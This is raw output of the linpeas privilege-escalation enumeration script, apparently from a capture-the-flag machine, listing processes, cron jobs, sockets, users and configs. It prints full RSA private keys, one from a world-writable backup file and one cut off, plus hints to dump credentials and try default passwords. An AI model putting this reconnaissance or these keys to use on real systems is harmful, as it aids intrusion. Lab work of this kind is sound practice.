root       913  0.0  0.6 275768  6204 ?        Ssl  14:49   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       918  0.0  0.1   4396  1284 ?        Ss   14:49   0:00 /usr/sbin/acpid
root       928  0.0  0.0  13372   160 ?        Ss   14:49   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root       954  0.0  0.6 277180  6152 ?        Ssl  14:49   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       958  0.0  0.0   5220   152 ?        Ss   14:49   0:00 /sbin/iscsid
root       959  0.0  0.3   5720  3516 ?        S<Ls 14:49   0:00 /sbin/iscsid
root      1005  0.0  0.5  65512  5352 ?        Ss   14:49   0:00 /usr/sbin/sshd -D
jack      1526  0.0  0.3  92804  4008 ?        S    14:50   0:00  |   _ sshd: jack@pts/0
jack      1527  0.0  0.5  22576  5292 pts/0    Ss+  14:50   0:00  |       _ -bash
jack      6904  0.0  0.3  92804  3396 ?        S    15:14   0:00      _ sshd: jack@pts/1
jack      6905  0.0  0.5  22568  5172 pts/1    Ss   15:14   0:00          _ -bash
jack     20307  0.2  0.2   5408  2548 pts/1    S+   15:16   0:00              _ /bin/sh ./linpeas.sh
jack     24475  0.0  0.0   5408   996 pts/1    S+   15:16   0:00                  _ /bin/sh ./linpeas.sh
jack     24479  0.0  0.3  37508  3376 pts/1    R+   15:16   0:00                  |   _ ps fauxwww
jack     24478  0.0  0.0   5408   996 pts/1    S+   15:16   0:00                  _ /bin/sh ./linpeas.sh
root      1057  0.0  0.2  15752  2160 ttyS0    Ss+  14:49   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1060  0.0  0.1  15936  1796 tty1     Ss+  14:49   0:00 /sbin/agetty --noclear tty1 linux
root      1122  0.0  0.3  21168  3584 ?        S    14:49   0:00 /bin/bash /usr/bin/mysqld_safe
mysql     1283  0.0  6.7 598116 68240 ?        Sl   14:49   0:01  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      1284  0.0  0.1  26088  1412 ?        S    14:49   0:00  _ logger -t mysqld -p daemon error
root      1197  0.0  3.4 429088 35344 ?        Ss   14:49   0:00 /usr/sbin/apache2 -k start
www-data  1353  0.0  3.5 505884 35820 ?        S    14:49   0:00  _ /usr/sbin/apache2 -k start
www-data  1354  0.0  4.0 508020 40908 ?        S    14:49   0:00  _ /usr/sbin/apache2 -k start
www-data  1355  0.0  3.5 505884 35772 ?        S    14:49   0:00  _ /usr/sbin/apache2 -k start
www-data  1356  0.0  3.5 505884 35772 ?        S    14:49   0:00  _ /usr/sbin/apache2 -k start
www-data  1357  0.0  3.5 505884 35772 ?        S    14:49   0:00  _ /usr/sbin/apache2 -k start
www-data  1458  0.0  3.5 505884 35772 ?        S    14:50   0:00  _ /usr/sbin/apache2 -k start
jack      1464  0.0  0.4  45280  4728 ?        Ss   14:50   0:00 /lib/systemd/systemd --user
jack      1466  0.0  0.2  61468  2156 ?        S    14:50   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jan  9  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Jan  8  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Jan  9  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan  8  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan  8  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Jan  8  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/emergency.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Thu 2023-01-19 05:01:57 CST  13h left Wed 2023-01-18 14:49:24 CST  27min ago apt-daily.timer              apt-daily.service
Thu 2023-01-19 06:03:24 CST  14h left Wed 2023-01-18 14:49:24 CST  27min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2023-01-19 15:04:40 CST  23h left Wed 2023-01-18 15:04:40 CST  11min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a      n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 879 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                   1 systemd         root             :1.1          init.scope                -          -                  
:1.2                                 913 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
:1.3                                 954 polkitd         root             :1.3          polkitd.service           -          -                  
:1.37                              27044 busctl          jack             :1.37         session-16.scope          16         -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts             913 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus                 901 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.PolicyKit1           954 polkitd         root             :1.3          polkitd.service           -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               879 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
jack
127.0.0.1	localhost
127.0.1.1	jack

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:7f:4e:0e:6e:a3  
          inet addr:10.10.12.106  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::7f:4eff:fe0e:6ea3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:3554 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4811 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:989158 (989.1 KB)  TX bytes:1158629 (1.1 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:301 errors:0 dropped:0 overruns:0 frame:0
          TX packets:301 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:23204 (23.2 KB)  TX bytes:23204 (23.2 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
jack:x:1000:1000:Jack Torrance,,,:/home/jack:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=118(mysql) groups=118(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 15:16:29 up 27 min,  2 users,  load average: 0.25, 0.16, 0.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jack     pts/0    10.8.19.103      14:50   19:25   0.05s  0.05s -bash
jack     pts/1    10.8.19.103      15:14   13.00s  0.08s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
root     pts/0        Fri Jan 10 18:31:17 2020 - crash                     (00:12)     192.168.1.137
reboot   system boot  Fri Jan 10 18:29:33 2020   still running                         0.0.0.0
root     pts/0        Fri Jan 10 15:00:06 2020 - crash                     (03:29)     192.168.1.137
reboot   system boot  Fri Jan 10 14:57:44 2020   still running                         0.0.0.0
jack     pts/0        Thu Jan  9 13:23:50 2020 - crash                    (1+01:33)    192.168.1.137
reboot   system boot  Thu Jan  9 13:22:38 2020   still running                         0.0.0.0
jack     pts/0        Thu Jan  9 09:57:09 2020 - crash                     (03:25)     192.168.1.137
reboot   system boot  Wed Jan  8 11:23:36 2020   still running                         0.0.0.0

wtmp begins Wed Jan  8 11:23:36 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/1    10.11.12.223     Mon Nov 16 14:33:47 -0600 2020
jack             pts/1    10.8.19.103      Wed Jan 18 15:14:56 -0600 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-5

╔══════════╣ MySQL
mysql  Ver 15.1 Distrib 10.0.38-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
MySQL user: mysql
user'

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 Feb  7  2019 /etc/mysql/mariadb.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Jan  9  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2019-10-08T13:31:25
httpd Not Found

Nginx version: nginx Not Found

./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jan 10  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Jan 10  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 34 Jan  9  2020 /etc/apache2/sites-enabled/octobercms.conf -> ../sites-available/octobercms.conf
lrwxrwxrwx 1 root root 35 Jan 10  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jun 11  2018 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jan 10  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 70999 Oct 24  2019 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Oct 24  2019 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw---- 1 www-data www-data 3220 Jan 10  2020 /var/www/html/wp-config.php

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Jan  8  2020 /etc/ldap

drwxr-xr-x 2 root root 4096 Jan  9  2020 /usr/share/php7.0-ldap/ldap

-rw-r--r-- 1 root root 0 Jan  9  2020 /var/lib/php/modules/7.0/apache2/enabled_by_maint/ldap

-rw-r--r-- 1 root root 0 Jan  9  2020 /var/lib/php/modules/7.0/cli/enabled_by_maint/ldap

-rw-r--r-- 1 root root 0 Jan  9  2020 /var/lib/php/modules/7.0/registry/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw------- 1 jack jack 1675 Jan 10  2020 /home/jack/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----
-rw-r--r-- 1 jack jack 391 Jan 10  2020 /home/jack/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF8FH0X1Xkbaye/VdprG/dUdsVnZVlHAbJT5qHqSiYF5oCV2vxI0rXHTC795eMuOtadVpg4RTZhSsfOf924Hda+bzHIDRPzH9ZtXaixZpU5p+Q9K9ilXg51Ct1GhLc8Q5dGdL4Kc5MCA9ajb7F8fVd6V0XD1eJiumtO6CbAJxgO4FkHevOZYDyw9aMuOzrHM0rbpFBBuj3NrHB8R2Nndqf0meAknubSu0X28p4JF87VXyx3+3WW73oqqfgVlRNdAUQZ8Bi6kbpve+lHCqYjrLZWMrkzGUyYR3A/yjGYpHhdGq9IrXyblvLPxlS7VF8HxSD+kor1VVuT1AVZutXgTcX jack@jack
-rwxrwxrwx 1 root root 1675 Jan 10  2020 /var/backups/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
